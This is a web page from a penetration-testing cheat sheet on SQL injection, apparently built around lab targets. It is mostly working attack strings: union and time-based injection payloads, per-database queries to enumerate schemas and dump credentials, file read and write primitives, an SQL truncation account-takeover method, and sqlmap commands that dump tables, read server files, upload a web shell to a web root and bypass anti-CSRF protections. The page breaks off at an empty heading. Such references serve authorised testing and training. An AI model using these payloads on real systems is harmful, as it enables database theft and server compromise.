<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/assets/css/style.css?v=">
    <link rel="stylesheet" href="../assets/css/style.css">
    <link rel="stylesheet" href="/assets/css/style.css">
    <link rel="stylesheet" href="/assets/css/style.css?v=">

    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->

<!-- Setup theme-color -->
<!-- start theme color meta headers -->
<meta name="theme-color" content="#151515">
<meta name="msapplication-navbutton-color" content="#151515">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<!-- end theme color meta headers -->


<!-- Setup Google Analytics -->



<!-- You can set your favicon here -->
<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->

<!-- end custom head snippets -->


<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Pentest CheatSheet | Pentest CheatSheet</title>
<meta name="generator" content="Jekyll v3.10.0" />
<meta property="og:title" content="Pentest CheatSheet" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Pentest CheatSheet" />
<meta property="og:description" content="Pentest CheatSheet" />
<link rel="canonical" href="http://localhost:4000/zNew/Web/OWASP/SQLi.html" />
<meta property="og:url" content="http://localhost:4000/zNew/Web/OWASP/SQLi.html" />
<meta property="og:site_name" content="Pentest CheatSheet" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Pentest CheatSheet" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebPage","description":"Pentest CheatSheet","headline":"Pentest CheatSheet","url":"http://localhost:4000/zNew/Web/OWASP/SQLi.html"}</script>
<!-- End Jekyll SEO tag -->

  </head>

  <body>
    <header>
      <div class="container">
        <a id="a-title" href="/">
          <h1>Pentest CheatSheet</h1>
        </a>
        <h2>Pentest CheatSheet</h2>

        <section id="downloads">
          
          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
        </section>
      </div>
    </header>

    <div class="container">
      <section id="main_content">
        <h1 id="sql-injectionsqli">SQL INJECTION(SQLi)</h1>
<ul>
  <li><a href="https://book.hacktricks.xyz/pentesting-web/sql-injection">HackTricks</a></li>
  <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md">PayLoads</a></li>
  <li><a href="https://sqlwiki.netspi.com/injectionTypes/blindBased/#mysql">NetSPI</a></li>
  <li>https://tib3rius.com/sqli</li>
  <li>portswigger</li>
  <li>https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/</li>
</ul>

<p>dbfiddle.uk</p>

<p>We want to find credentials exploring possible DBs and tables. Another way is to read files.</p>

<h2 id="manual">manual:</h2>

<p>admin’ or 1=1 LIMIT 1– -</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">admin' union select 1;-- -</code></li>
  <li>FIND ALL DBS:
<code class="language-plaintext highlighter-rouge">admin' UNION SELECT group_concat(schema_name) FROM information_schema.schemata;-- -</code></li>
  <li>FIND TABLES IN DB:
<code class="language-plaintext highlighter-rouge">admin' UNION SELECT group_concat(table_name) FROM information_schema.tables where table_schema='november';-- -</code></li>
  <li>FIND COLUMNS IN TABLE:
<code class="language-plaintext highlighter-rouge">admin' UNION SELECT group_concat(table_name, ':', column_name) FROM INFORMATION_SCHEMA.columns WHERE table_schema='november';-- -</code></li>
  <li>FIND VALUES:
<code class="language-plaintext highlighter-rouge">admin' UNION SELECT group_concat(one) FROM flag;-- -</code></li>
  <li>READ FILES:
<code class="language-plaintext highlighter-rouge">admin' UNION SELECT load_file('/var/www/html/index.php');-- -</code></li>
</ul>

<h2 id="manual-time-based">manual time based:</h2>
<ul>
  <li>FIND DB NUMBER OF CHARACTERS:</li>
  <li><code class="language-plaintext highlighter-rouge">1%20OR%20IF(LENGTH((SELECT%20database()))=5,SLEEP(1),0)%23</code></li>
</ul>

<h2 id="sql-truncation">SQL Truncation</h2>

<p>SQL truncation is a flaw in the database configuration in which an input is truncated (deleted) when added to the database due to surpassing the maximum defined length. The database management system truncates any newly inserted values to fit the width of the designated column size.</p>

<p>So, where can we find this vulnerability ?? it can be found in any web application that allows users to sign up/register for new accounts.</p>

<p>If the database considers spaces as valid characters between inputs and doesn’t do any trimming before storing the values, an attacker can create a duplicate accounts of an existing user like ‘’admin’’ with many additional spaces and characters — ‘’admin++++++random’’ that are too long to be stored in the specified column and gets deleted after passing the max length.</p>

<p>So, instead of storing “admin++++++random’’ as an entry, the database will truncate the second half to fit it in the column (‘’admin +++++’’).</p>

<p>Next time an attacker logs in to the application with the admin account, the database will search for all matching accounts and will consider them valid for logging in. Therefore any entry with username as admin with space or without is a valid entry that can be used to authenticate to the application.</p>

<p>“admin” == ‘admin +++++’</p>

<h1 id="identifying-sqli">Identifying SQLi</h1>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' '</span>
<span class="s1">'||'</span>
<span class="s1">'+'</span>
<span class="s1">' AND '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">1</span>
<span class="s1">' OR '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">1</span>
<span class="s1">' -- -
'</span> <span class="k">OR</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1;-- -
</span></code></pre></div></div>

<hr />

<h1 id="identifying-variants">Identifying Variants</h1>
<h2 id="mysql">MySQL</h2>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">AND</span> <span class="s1">'foo'</span> <span class="s1">'bar'</span> <span class="o">=</span> <span class="s1">'foobar'</span>	
</code></pre></div></div>

<h2 id="postgresql">PostgreSQL</h2>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">AND</span> <span class="n">TO_HEX</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="s1">'1'</span>	
</code></pre></div></div>

<h2 id="mssql">MSSQL</h2>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">AND</span> <span class="n">DATALENGTH</span><span class="p">(</span><span class="s1">'foo'</span><span class="p">)</span> <span class="o">=</span> <span class="mi">3</span>
</code></pre></div></div>

<h2 id="oracle">Oracle</h2>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">AND</span> <span class="n">LENGTHB</span><span class="p">(</span><span class="s1">'foo'</span><span class="p">)</span> <span class="o">=</span> <span class="s1">'3'</span>	
</code></pre></div></div>

<h2 id="sqlite">SQLite</h2>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">AND</span> <span class="n">GLOB</span><span class="p">(</span><span class="s1">'foo*'</span><span class="p">,</span> <span class="s1">'foobar'</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span>	
</code></pre></div></div>

<hr />

<h1 id="list-databases">List Databases</h1>
<h2 id="mysql-1">MySQL</h2>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="k">schema_name</span> <span class="k">FROM</span> <span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">SCHEMATA</span>
<span class="k">SELECT</span> <span class="n">db</span> <span class="k">FROM</span> <span class="n">mysql</span><span class="p">.</span><span class="n">db</span>
</code></pre></div></div>

<h2 id="postgresql-1">PostgreSQL</h2>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">datname</span> <span class="k">FROM</span> <span class="n">pg_database</span>
<span class="k">SELECT</span> <span class="k">DISTINCT</span><span class="p">(</span><span class="n">schemaname</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">pg_tables</span>
</code></pre></div></div>

<h2 id="mssql-1">MSSQL</h2>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">name</span> <span class="k">FROM</span> <span class="n">master</span><span class="p">.</span><span class="n">sys</span><span class="p">.</span><span class="n">databases</span>
<span class="k">SELECT</span> <span class="n">name</span> <span class="k">FROM</span> <span class="n">master</span><span class="p">..</span><span class="n">sysdatabases</span>
</code></pre></div></div>

<h2 id="oracle-1">Oracle</h2>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="k">OWNER</span> <span class="k">FROM</span> <span class="p">(</span><span class="k">SELECT</span> <span class="k">DISTINCT</span><span class="p">(</span><span class="k">OWNER</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">SYS</span><span class="p">.</span><span class="n">ALL_TABLES</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="sqlite-1">SQLite</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>N/A
</code></pre></div></div>

<hr />

<h1 id="list-tables">List Tables</h1>
<h2 id="mysql-2">MySQL</h2>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="k">table_name</span> <span class="k">FROM</span> <span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">TABLES</span> <span class="k">WHERE</span> <span class="n">table_schema</span><span class="o">=</span><span class="s1">'[DBNAME]'</span>
<span class="k">SELECT</span> <span class="n">database_name</span><span class="p">,</span><span class="k">table_name</span> <span class="k">FROM</span> <span class="n">mysql</span><span class="p">.</span><span class="n">innodb_table_stats</span> <span class="k">WHERE</span> <span class="n">database_name</span><span class="o">=</span><span class="s1">'[DBNAME]'</span>
</code></pre></div></div>

<h2 id="postgresql-2">PostgreSQL</h2>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">tablename</span> <span class="k">FROM</span> <span class="n">pg_tables</span> <span class="k">WHERE</span> <span class="n">schemaname</span> <span class="o">=</span> <span class="s1">'[SCHEMA_NAME]'</span>
<span class="k">SELECT</span> <span class="k">table_name</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">WHERE</span> <span class="n">table_schema</span><span class="o">=</span><span class="s1">'[SCHEMA_NAME]'</span>
</code></pre></div></div>

<h2 id="mssql-2">MSSQL</h2>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="k">table_name</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">WHERE</span> <span class="n">table_catalog</span><span class="o">=</span><span class="s1">'[DBNAME]'</span>
<span class="k">SELECT</span> <span class="n">name</span> <span class="k">FROM</span> <span class="p">[</span><span class="n">DBNAME</span><span class="p">]..</span><span class="n">sysobjects</span> <span class="k">WHERE</span> <span class="n">xtype</span><span class="o">=</span><span class="s1">'U'</span>
</code></pre></div></div>

<h2 id="oracle-2">Oracle</h2>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="k">OWNER</span><span class="p">,</span><span class="k">TABLE_NAME</span> <span class="k">FROM</span> <span class="n">SYS</span><span class="p">.</span><span class="n">ALL_TABLES</span> <span class="k">WHERE</span> <span class="k">OWNER</span><span class="o">=</span><span class="s1">'[DBNAME]'</span>
</code></pre></div></div>

<h2 id="sqlite-2">SQLite</h2>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">tbl_name</span> <span class="k">FROM</span> <span class="n">sqlite_master</span> <span class="k">WHERE</span> <span class="k">type</span><span class="o">=</span><span class="s1">'table'</span>
</code></pre></div></div>

<hr />

<h1 id="list-columns">List Columns</h1>
<h2 id="mysql-3">MySQL</h2>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="k">column_name</span><span class="p">,</span><span class="n">column_type</span> <span class="k">FROM</span> <span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">COLUMNS</span> <span class="k">WHERE</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">'[TABLE_NAME]'</span> <span class="k">AND</span> <span class="n">table_schema</span><span class="o">=</span><span class="s1">'[DBNAME]'</span>
</code></pre></div></div>

<h2 id="postgresql-3">PostgreSQL</h2>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="k">column_name</span><span class="p">,</span><span class="n">data_type</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">WHERE</span> <span class="n">table_schema</span><span class="o">=</span><span class="s1">'[DBNAME]'</span> <span class="k">AND</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">'[TABLE_NAME]'</span>
</code></pre></div></div>

<h2 id="mssql-3">MSSQL</h2>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">COL_NAME</span><span class="p">(</span><span class="n">OBJECT_ID</span><span class="p">(</span><span class="s1">'[DBNAME].[TABLE_NAME]'</span><span class="p">),</span> <span class="p">[</span><span class="k">INDEX</span><span class="p">])</span>
</code></pre></div></div>

<h2 id="oracle-3">Oracle</h2>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="k">COLUMN_NAME</span><span class="p">,</span><span class="n">DATA_TYPE</span> <span class="k">FROM</span> <span class="n">SYS</span><span class="p">.</span><span class="n">ALL_TAB_COLUMNS</span> <span class="k">WHERE</span> <span class="k">TABLE_NAME</span><span class="o">=</span><span class="s1">'[TABLE_NAME]'</span> <span class="k">AND</span> <span class="k">OWNER</span><span class="o">=</span><span class="s1">'[DBNAME]'</span>
</code></pre></div></div>

<h2 id="sqlite-3">SQLite</h2>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="k">MAX</span><span class="p">(</span><span class="k">sql</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">sqlite_master</span> <span class="k">WHERE</span> <span class="n">tbl_name</span><span class="o">=</span><span class="s1">'[TABLE_NAME]'</span>
<span class="k">SELECT</span> <span class="n">name</span> <span class="k">FROM</span> <span class="n">PRAGMA_TABLE_INFO</span><span class="p">(</span><span class="s1">'[TABLE_NAME]'</span><span class="p">)</span>
</code></pre></div></div>

<hr />

<h1 id="db-user">DB User</h1>
<h2 id="mysql-4">MySQL</h2>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="k">USER</span><span class="p">()</span>
<span class="k">SELECT</span> <span class="k">CURRENT_USER</span><span class="p">()</span>
<span class="k">SELECT</span> <span class="k">user</span> <span class="k">from</span> <span class="n">mysql</span><span class="p">.</span><span class="k">user</span>
</code></pre></div></div>

<hr />

<h1 id="user-privileges">User Privileges</h1>
<p>Now that we know our user, we can start looking for what privileges we have with that user. First of all, we can test if we have super admin privileges with the following query:</p>

<h2 id="super-admin-privileges">Super admin privileges</h2>
<blockquote>
  <p>The query returns Y, which means YES, indicating superuser privileges.</p>
</blockquote>

<h3 id="mysql-5">MySQL</h3>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="p">,</span> <span class="n">super_priv</span> <span class="k">FROM</span> <span class="n">mysql</span><span class="p">.</span><span class="k">user</span> <span class="k">WHERE</span> <span class="k">user</span><span class="o">=</span><span class="nv">"user"</span><span class="p">;</span>
</code></pre></div></div>

<h2 id="other-privileges">Other Privileges</h2>
<blockquote>
  <p>We can also dump other privileges we have directly from the schema, with the following query:</p>
</blockquote>

<h3 id="mysql-6">MySQL</h3>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">grantee</span><span class="p">,</span> <span class="n">privilege_type</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">user_privileges</span> <span class="k">WHERE</span> <span class="n">grantee</span><span class="o">=</span><span class="nv">"user@host"</span><span class="p">;</span><span class="c1">-- -</span>
</code></pre></div></div>

<hr />

<h1 id="files">Files</h1>
<p>First, we have to determine which user we are within the database. While we do not necessarily need database administrator (DBA) privileges to read data, this is becoming more required in modern DBMSes, as only DBA are given such privileges. The same applies to other common databases. If we do have DBA privileges, then it is much more probable that we have file-read privileges. If we do not, then we have to check our privileges to see what we can do. To be able to find our current DB user, we can use any of the following queries:</p>

<h2 id="read">Read</h2>
<h3 id="mysql-7">MySQL</h3>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">LOAD_FILE</span><span class="p">(</span><span class="s1">'/path/to/file'</span><span class="p">)</span>
</code></pre></div></div>

<p>To be able to write files to the back-end server using a MySQL database, we require three things:</p>

<ul>
  <li>User with FILE privilege enabled</li>
  <li>MySQL global secure_file_priv variable not enabled</li>
  <li>Write access to the location we want to write to on the back-end server</li>
</ul>

<h3 id="postgresql-4">PostgreSQL</h3>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PG_READ_FILE</span><span class="p">(</span><span class="s1">'/path/to/file'</span><span class="p">)</span>
</code></pre></div></div>

<h3 id="mssql-4">MSSQL</h3>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">OPENROWSET</span><span class="p">(</span><span class="n">BULK</span> <span class="s1">'C:</span><span class="se">\p</span><span class="s1">ath</span><span class="se">\t</span><span class="s1">o</span><span class="se">\f</span><span class="s1">ile'</span><span class="p">,</span> <span class="n">SINGLE_CLOB</span><span class="p">)</span>
</code></pre></div></div>

<h3 id="oracle-4">Oracle</h3>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">utl_file</span><span class="p">.</span><span class="n">get_line</span><span class="p">(</span><span class="n">utl_file</span><span class="p">.</span><span class="n">fopen</span><span class="p">(</span><span class="s1">'/path/to/'</span><span class="p">,</span><span class="s1">'file'</span><span class="p">,</span><span class="s1">'R'</span><span class="p">),</span> <span class="o">&lt;</span><span class="n">buffer</span><span class="o">&gt;</span><span class="p">)</span>
</code></pre></div></div>

<h3 id="sqlite-4">SQLite</h3>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">readfile</span><span class="p">(</span><span class="s1">'/path/to/file'</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="write">Write</h2>
<h3 id="mysql-8">MySQL</h3>
<p>There are hundreds of global variables in a MySQL configuration, and we don’t want to retrieve all of them. We will then filter the results to only show the secure_file_priv variable.
If secure_file_priv value is empty, meaning that we can read/write files to any location.</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">variable_name</span><span class="p">,</span> <span class="n">variable_value</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">global_variables</span> <span class="k">where</span> <span class="n">variable_name</span><span class="o">=</span><span class="nv">"secure_file_priv"</span>
</code></pre></div></div>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="s1">'contents'</span> <span class="k">INTO</span> <span class="n">OUTFILE</span> <span class="s1">'/path/to/file'</span>
</code></pre></div></div>

<h3 id="postgresql-5">PostgreSQL</h3>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">COPY</span> <span class="p">(</span><span class="k">SELECT</span> <span class="s1">'contents'</span><span class="p">)</span> <span class="k">TO</span> <span class="s1">'/path/to/file'</span>
</code></pre></div></div>

<h3 id="mssql-5">MSSQL</h3>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">execute</span> <span class="n">spWriteStringToFile</span> <span class="s1">'contents'</span><span class="p">,</span> <span class="s1">'C:</span><span class="se">\p</span><span class="s1">ath</span><span class="se">\t</span><span class="s1">o</span><span class="se">\'</span><span class="s1">, '</span><span class="n">file</span><span class="s1">'
</span></code></pre></div></div>

<h3 id="oracle-5">Oracle</h3>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">utl_file</span><span class="p">.</span><span class="n">put_line</span><span class="p">(</span><span class="n">utl_file</span><span class="p">.</span><span class="n">fopen</span><span class="p">(</span><span class="s1">'/path/to/'</span><span class="p">,</span><span class="s1">'file'</span><span class="p">,</span><span class="s1">'R'</span><span class="p">),</span> <span class="o">&lt;</span><span class="n">buffer</span><span class="o">&gt;</span><span class="p">)</span>
</code></pre></div></div>

<h3 id="sqlite-5">SQLite</h3>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">writefile</span><span class="p">(</span><span class="s1">'/path/to/file'</span><span class="p">,</span> <span class="k">column_name</span><span class="p">)</span> <span class="k">FROM</span> <span class="k">table_name</span>
</code></pre></div></div>

<hr />

<h1 id="union-based">Union Based</h1>
<h2 id="detect-number-of-columns">Detect number of columns</h2>
<h3 id="mysql-9">MySQL</h3>
<h4 id="using-order-by">Using Order By</h4>
<p>The first way of detecting the number of columns is through the ORDER BY function, which we discussed earlier. We have to inject a query that sorts the results by a column we specified, ‘i.e., column 1, column 2, and so on’, until we get an error saying the column specified does not exist.</p>

<p>For example, we can start with order by 1, sort by the first column, and succeed, as the table must have at least one column. Then we will do order by 2 and then order by 3 until we reach a number that returns an error, or the page does not show any output, which means that this column number does not exist. The final successful column we successfully sorted by gives us the total number of columns.</p>

<p>If we failed at order by 4, this means the table has three columns, which is the number of columns we were able to sort by successfully. Let us go back to our previous example and attempt the same, with the following payload:</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cn</span><span class="s1">' order by 1;-- -
</span></code></pre></div></div>

<h4 id="using-union">Using UNION</h4>
<p>The other method is to attempt a Union injection with a different number of columns until we successfully get the results back. The first method always returns the results until we hit an error, while this method always gives an error until we get a success.</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cn</span><span class="s1">' UNION select 1,2,3;-- -
</span></code></pre></div></div>

<hr />

<h1 id="sqlmap">SQLMap:</h1>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-r</span> request.req <span class="nt">--dbs</span>
sqlmap <span class="nt">-r</span> request.req <span class="nt">-D</span> main <span class="nt">--tables</span>
sqlmap <span class="nt">-r</span> request.req <span class="nt">-D</span> main <span class="nt">-T</span> user <span class="nt">--columns</span>
sqlmap <span class="nt">-r</span> request.req <span class="nt">-D</span> main <span class="nt">-T</span> user <span class="nt">--dump</span>
sqlmap <span class="nt">-r</span> req.req <span class="nt">--level</span><span class="o">=</span>5 <span class="nt">--risk</span><span class="o">=</span>3 <span class="nt">--batch</span> <span class="nt">--file-read</span><span class="o">=</span>/var/www/html/index.php&gt;
sqlmap <span class="nt">-r</span> req.req <span class="nt">--level</span><span class="o">=</span>5 <span class="nt">--risk</span><span class="o">=</span>3 <span class="nt">--batch</span> <span class="nt">--file-write</span><span class="o">=</span>/home/kali/Downloads/Exploit/webshell.php <span class="nt">--file-dest</span><span class="o">=</span>/var/www/html/webshell.php
sqlmap <span class="nt">-u</span> <span class="s2">"ws://soc-player.soccer.htb:9091"</span> <span class="nt">--data</span> <span class="s1">'{"id": "*"}'</span> <span class="nt">--threads</span> 10 <span class="nt">--level</span> 5 <span class="nt">--risk</span> 3 <span class="nt">--batch</span> <span class="nt">-D</span> soccer_db <span class="nt">-T</span> accounts <span class="nt">--dump</span>
</code></pre></div></div>
<ul>
  <li><code class="language-plaintext highlighter-rouge">-r</code> Request file</li>
  <li><code class="language-plaintext highlighter-rouge">--level</code> (max 5)</li>
  <li><code class="language-plaintext highlighter-rouge">--risk</code> (max 3)</li>
  <li><code class="language-plaintext highlighter-rouge">--batch</code> Ask no questions</li>
  <li><code class="language-plaintext highlighter-rouge">--no-cast</code> Assure the correct content</li>
  <li><code class="language-plaintext highlighter-rouge">--fresh-queries</code> Run the query again</li>
  <li><code class="language-plaintext highlighter-rouge">--prefix</code> Add a prefix before every payload</li>
  <li><code class="language-plaintext highlighter-rouge">--suffix</code> Add a suffix after every payload</li>
</ul>

<p><strong>Data Enumeration</strong></p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">--banner</code> Database version banner</li>
  <li><code class="language-plaintext highlighter-rouge">--current-user</code> Current user name</li>
  <li><code class="language-plaintext highlighter-rouge">--current-db</code> Current database name</li>
  <li><code class="language-plaintext highlighter-rouge">--is-dba</code> Checking if the current user has administrator rights.</li>
</ul>

<p><strong>Data Exfiltration</strong></p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">--dbs</code> Enumerate databases</li>
  <li><code class="language-plaintext highlighter-rouge">--tables</code> Enumerate DB tables</li>
  <li><code class="language-plaintext highlighter-rouge">--columns</code> Enumerate columns</li>
  <li><code class="language-plaintext highlighter-rouge">--dump</code> Get table values if table is given, if not all of the current database content will be retrieved</li>
  <li><code class="language-plaintext highlighter-rouge">-D</code> Select DB</li>
  <li><code class="language-plaintext highlighter-rouge">-T</code> Select Table</li>
  <li><code class="language-plaintext highlighter-rouge">-C</code> Select Columns</li>
  <li><code class="language-plaintext highlighter-rouge">--dump-all --exclude-sysdbs</code> All the content from all the databases will be retrieve except the content from system databases</li>
  <li><code class="language-plaintext highlighter-rouge">--where="name LIKE 'f%'"</code> Conditional Enumeration</li>
</ul>

<p><strong>Advanced Data Exfiltration</strong></p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">--schema</code> Retrieve the structure of all of the tables</li>
  <li><code class="language-plaintext highlighter-rouge">--search -T user</code> Search for databases, tables, and columns</li>
  <li><code class="language-plaintext highlighter-rouge">--passwords</code> Dump the content of system tables containing database-specific credentials</li>
</ul>

<p><strong>OS Exploitation</strong></p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">--file-read</code> Path to file that we want to read from server</li>
  <li><code class="language-plaintext highlighter-rouge">--file-write</code> Path to file that we want to upload to server</li>
  <li><code class="language-plaintext highlighter-rouge">--file-dest</code> Path to location that we want to put the uploaded file</li>
  <li><code class="language-plaintext highlighter-rouge">--os-shell</code> Directly execute OS command</li>
</ul>

<h2 id="request">Request</h2>
<h3 id="curl-commands">Curl Commands</h3>
<p>One of the best and easiest ways to properly set up an SQLMap request against the specific target (i.e., web request with parameters inside) is by utilizing Copy as cURL feature from within the Network (Monitor) panel inside the Chrome, Edge, or Firefox Developer Tools.</p>

<h3 id="getpost-requests">GET/POST Requests</h3>
<p>In the most common scenario, GET parameters are provided with the usage of option -u/–url, as in the previous example. As for testing POST data, the –data flag can be used.</p>

<p>In such cases, POST parameters uid and name will be tested for SQLi vulnerability. For example, if we have a clear indication that the parameter uid is prone to an SQLi vulnerability, we could narrow down the tests to only this parameter using -p uid. Otherwise, we could mark it inside the provided data with the usage of special marker *.</p>

<h2 id="bypassing-web-application-protections">Bypassing Web Application Protections</h2>
<h3 id="anti-csrf-token-bypass">Anti-CSRF Token Bypass</h3>
<p>One of the first lines of defense against the usage of automation tools is the incorporation of anti-CSRF (i.e., Cross-Site Request Forgery) tokens into all HTTP requests, especially those generated as a result of web-form filling.</p>

<p>In most basic terms, each HTTP request in such a scenario should have a (valid) token value available only if the user actually visited and used the page. While the original idea was the prevention of scenarios with malicious links, where just opening these links would have undesired consequences for unaware logged-in users (e.g., open administrator pages and add a new user with predefined credentials), this security feature also inadvertently hardened the applications against the (unwanted) automation.</p>

<p>Nevertheless, SQLMap has options that can help in bypassing anti-CSRF protection. Namely, the most important option is –csrf-token. By specifying the token parameter name (which should already be available within the provided request data), SQLMap will automatically attempt to parse the target response content and search for fresh token values so it can use them in the next request.</p>

<p>Additionally, even in a case where the user does not explicitly specify the token’s name via –csrf-token, if one of the provided parameters contains any of the common infixes (i.e. csrf, xsrf, token), the user will be prompted whether to update it in further requests.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>sqlmap <span class="nt">-u</span> <span class="s2">"http://www.example.com/"</span> <span class="nt">--data</span><span class="o">=</span><span class="s2">"id=1&amp;csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE"</span> <span class="nt">--csrf-token</span><span class="o">=</span><span class="s2">"csrf-token"</span>
</code></pre></div></div>

<h3 id="unique-value-bypass">Unique Value Bypass</h3>
<p>In some cases, the web application may only require unique values to be provided inside predefined parameters. Such a mechanism is similar to the anti-CSRF technique described above, except that there is no need to parse the web page content. So, by simply ensuring that each request has a unique value for a predefined parameter, the web application can easily prevent CSRF attempts while at the same time averting some of the automation tools. For this, the option –randomize should be used, pointing to the parameter name containing a value which should be randomized before being sent.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>sqlmap <span class="nt">-u</span> <span class="s2">"http://www.example.com/?id=1&amp;rp=29125"</span> <span class="nt">--randomize</span><span class="o">=</span>rp <span class="nt">--batch</span> <span class="nt">-v</span> 5
</code></pre></div></div>

<h3 id="calculated-parameter-bypass">Calculated Parameter Bypass</h3>
<p>Another similar mechanism is where a web application expects a proper parameter value to be calculated based on some other parameter value(s). Most often, one parameter value has to contain the message digest (e.g. h=MD5(id)) of another one. To bypass this, the option –eval should be used, where a valid Python code is being evaluated just before the request is being sent to the target.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>sqlmap <span class="nt">-u</span> <span class="s2">"http://www.example.com/?id=1&amp;h=c4ca4238a0b923820dcc509a6f75849b"</span> <span class="nt">--eval</span><span class="o">=</span><span class="s2">"import hashlib; h=hashlib.md5(id).hexdigest()"</span> <span class="nt">--batch</span> <span class="nt">-v</span> 5 
</code></pre></div></div>

<h3 id="ip-address-concealing">IP Address Concealing</h3>
